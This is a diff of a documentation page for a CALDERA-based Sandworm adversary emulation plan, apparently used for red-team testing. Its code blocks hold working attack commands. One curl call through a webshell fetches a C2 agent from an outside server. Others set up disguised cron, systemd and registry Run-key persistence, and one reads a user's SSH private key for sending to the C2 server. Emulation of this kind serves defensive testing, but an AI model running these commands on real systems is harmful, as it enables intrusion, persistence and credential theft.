@@ -7,7 +7,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
     <meta name="turbo-root" content="/ael">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.6.0.781992544188">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.6.0.781992821865">
 
     <!-- See retype.com -->
     <meta name="generator" content="Retype 3.6.0">
@@ -35,11 +35,11 @@
     <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
     <link href="../../../../favicon.png" rel="icon">
-    <link href="../../../../resources/css/retype.css?v=3.6.0.781992544188" rel="stylesheet">
+    <link href="../../../../resources/css/retype.css?v=3.6.0.781992821865" rel="stylesheet">
 
-    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.6.0.781992544188" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.6.0.781992821865" data-turbo-eval="false" defer></script>
     <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.6.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.6.0.781992544188" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.6.0.781992821865" data-turbo-eval="false" defer></script>
 </head>
 <body>
     <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
@@ -433,16 +433,19 @@ python3 ~/caldera/app/utility/file_decryptor.py -c ~/caldera/conf/local.yml /tmp
     </h2>
 </doc-anchor-target>
 <ul>
-<li><code v-pre>sshpass</code> is used to pass in the initial user&#x27;s SSH credentials to <code v-pre>scp</code> and <code v-pre>ssh</code> in a programmatic way, without having to do so manually.</li>
-<li>Because the payload file is downloaded to the attacker machine agent&#x27;s current working directory, the file path used in the scp command for the webshell is <code v-pre>./obfuscated_webShell.php</code> instead of <code v-pre>sandworm/Resources/phpWebShell/obfuscated_webShell.php</code>.</li>
-<li>Cleanup for step 11 is included and is modified to run via <code v-pre>sshpass</code> and <code v-pre>ssh</code>:
+<li><p><code v-pre>sshpass</code> is used to pass in the initial user&#x27;s SSH credentials to <code v-pre>scp</code> and <code v-pre>ssh</code> in a programmatic way, without having to do so manually.</p>
+</li>
+<li><p>Because the payload file is downloaded to the attacker machine agent&#x27;s current working directory, the file path used in the scp command for the webshell is <code v-pre>./obfuscated_webShell.php</code> instead of <code v-pre>sandworm/Resources/phpWebShell/obfuscated_webShell.php</code>.</p>
+</li>
+<li><p>Cleanup for step 11 is included and is modified to run via <code v-pre>sshpass</code> and <code v-pre>ssh</code>:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-none"><code v-pre class="language-none">sshpass -p #{initial.user.password} ssh #{initial.user.name}@#{initial.target.host} &quot;sudo rm -f /var/www/html/search.php&quot;;
 sshpass -p #{initial.user.password} ssh #{initial.user.name}@#{initial.target.host} &quot;sudo rm -f /var/www/html/centreon_module_linux_app64&quot;;
 sshpass -p #{initial.user.password} ssh #{initial.user.name}@#{initial.target.host} 'printf &quot;ps auxf | grep -i httpd\nnetstat -antp | grep -i httpd\n&quot; | sudo tee /var/www/html/include/tools/check.sh &gt; /dev/null'</code></pre>
 </doc-codeblock></div>
 </li>
-<li>If the automated cleanup for step 11 fails, please follow manual cleanup instructions from <a href="../../resources/cleanup/">cleanup</a></li>
+<li><p>If the automated cleanup for step 11 fails, please follow manual cleanup instructions from <a href="../../resources/cleanup/">cleanup</a></p>
+</li>
 </ul>
 <doc-anchor-target id="step-12">
     <h2>
@@ -461,16 +464,19 @@ sshpass -p #{initial.user.password} ssh #{initial.user.name}@#{initial.target.ho
     </h2>
 </doc-anchor-target>
 <ul>
-<li>The CALDERA agent executable will be downloaded as <code v-pre>centreon_module_linux_app64</code> and will be used instead of the actual <code v-pre>centreon_module_linux_app64</code> file used in evals.
+<li><p>The CALDERA agent executable will be downloaded as <code v-pre>centreon_module_linux_app64</code> and will be used instead of the actual <code v-pre>centreon_module_linux_app64</code> file used in evals.</p>
 <ul>
-<li>The agent will act as the remote access implant and will replace the Exaramel-Linux-based malware from evals.</li>
-<li>The <code v-pre>curl</code> request used to download the agent executable has been modified in order to perform an HTTP POST request and pass in required headers for compiling the agent executable. It will look something like the following:</li>
-</ul>
+<li><p>The agent will act as the remote access implant and will replace the Exaramel-Linux-based malware from evals.</p>
+</li>
+<li><p>The <code v-pre>curl</code> request used to download the agent executable has been modified in order to perform an HTTP POST request and pass in required headers for compiling the agent executable. It will look something like the following:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-none"><code v-pre class="language-none">curl --insecure &quot;https://10.0.1.5/search.php?cmd=curl+--insecure+-X+POST+-H+file:sandcat.go+-H+platform:linux+-H+server:http://192.168.0.4:8888+-H+group:caladan+http://192.168.0.4:8888/file/download+-o+centreon_module_linux_app64&quot; 2&gt;/dev/null;</code></pre>
 </doc-codeblock></div>
 </li>
-<li>An extra ability is included to wait for 40 seconds for the new elevated agent to start beaconing in to the C2 server.</li>
+</ul>
+</li>
+<li><p>An extra ability is included to wait for 40 seconds for the new elevated agent to start beaconing in to the C2 server.</p>
+</li>
 </ul>
 <doc-anchor-target id="step-14">
     <h2>
@@ -479,14 +485,14 @@ sshpass -p #{initial.user.password} ssh #{initial.user.name}@#{initial.target.ho
     </h2>
 </doc-anchor-target>
 <ul>
-<li>The following command is run via <code v-pre>sh</code> to emulate the original GoLang implementation for cron persistence:
+<li><p>The following command is run via <code v-pre>sh</code> to emulate the original GoLang implementation for cron persistence:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-none"><code v-pre class="language-none">dir=$(dirname /var/www/html/centreon_module_linux_app64);
 croncontents=$(crontab -l 2&gt;/dev/null);
 printf &quot;$croncontents\n1 * * * * cd $dir &amp;&amp; centreon_module_linux_app64\n@reboot cd $dir &amp;&amp; centreon_module_linux_app64\n&quot; | crontab -</code></pre>
 </doc-codeblock></div>
 </li>
-<li>The following command is run via <code v-pre>sh</code> to emulate the original GoLang implementation for systemd persistence:
+<li><p>The following command is run via <code v-pre>sh</code> to emulate the original GoLang implementation for systemd persistence:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-none"><code v-pre class="language-none">printf &quot;[Unit]\nDescription=Syslog daemon\n\n[Service]\nWorkingDirectory=$(dirname #{location})\nExecStartPre=/bin/rm -f /tmp/.applocktx\nExecStart=#{location}\nRestart=always\n\n[Install]\nWantedBy=multi-user.target&quot; &gt; /etc/systemd/system/syslogd.service;
 chmod 0644 /etc/systemd/system/syslogd.service;
@@ -494,7 +500,8 @@ systemctl enable syslogd.service;
 systemctl daemon-reload;</code></pre>
 </doc-codeblock></div>
 </li>
-<li>Instead of transferring the SSH key files directly to the CALDERA server, the agent will execute the following <code v-pre>cat</code> commands via <code v-pre>sh</code> and send the output to the CALDERA server: <code v-pre>cat /home/fherbert/.ssh/id_rsa;cat /home/fherbert/.ssh/id_rsa.pub;</code></li>
+<li><p>Instead of transferring the SSH key files directly to the CALDERA server, the agent will execute the following <code v-pre>cat</code> commands via <code v-pre>sh</code> and send the output to the CALDERA server: <code v-pre>cat /home/fherbert/.ssh/id_rsa;cat /home/fherbert/.ssh/id_rsa.pub;</code></p>
+</li>
 </ul>
 <doc-anchor-target id="step-15">
     <h2>
@@ -511,14 +518,15 @@ systemctl daemon-reload;</code></pre>
 </li>
 <li>When running the psexec python script, since the user&#x27;s environment may not have the script pre-installed, or in a different directory, the user must download the script by executing the <code v-pre>./download_payloads.sh</code> script prior to starting the CALDERA server. This will download the required <code v-pre>psexec_sandworm.py</code> script in the payloads directory within the <code v-pre>emu</code> plugin.
 <ul>
-<li>The commandline when running the psexec script has been modified to run without any manual user input, and may look something like the following:</li>
-</ul>
+<li><p>The commandline when running the psexec script has been modified to run without any manual user input, and may look something like the following:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-none"><code v-pre class="language-none">./psexec_sandworm.py -service-name &quot;Windows Check AV&quot; WORKGROUP/username:userpassword@10.0.1.7 cmd /c 'reg.exe LOAD HKU\Temp &quot;C:\Users\username\NTUSER.DAT&quot; &amp; reg.exe ADD HKU\Temp\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d &quot;C:\Windows\wsmprovav.exe&quot;' 2&gt;&amp;1</code></pre>
 </doc-codeblock></div>
-<ul>
-<li>Note that the commands for loading the registry hive and setting registry persistence are performed in a single <code v-pre>cmd</code> command.</li>
-<li>Since the agent executable runs directly without acting as a stager or downloading further payloads, the commandline for the registry persistence has been condensed to simply run the <code v-pre>wsmprovav.exe</code> executable without any extra arguments. Also note that this will exclude <code v-pre>rundll32.exe</code> from the process tree.</li>
+</li>
+<li><p>Note that the commands for loading the registry hive and setting registry persistence are performed in a single <code v-pre>cmd</code> command.</p>
+</li>
+<li><p>Since the agent executable runs directly without acting as a stager or downloading further payloads, the commandline for the registry persistence has been condensed to simply run the <code v-pre>wsmprovav.exe</code> executable without any extra arguments. Also note that this will exclude <code v-pre>rundll32.exe</code> from the process tree.</p>
+</li>
 </ul>
 </li>
 <li>An extra ability is included to wait for 40 seconds for the new agent to start beaconing in to the C2 server.</li>
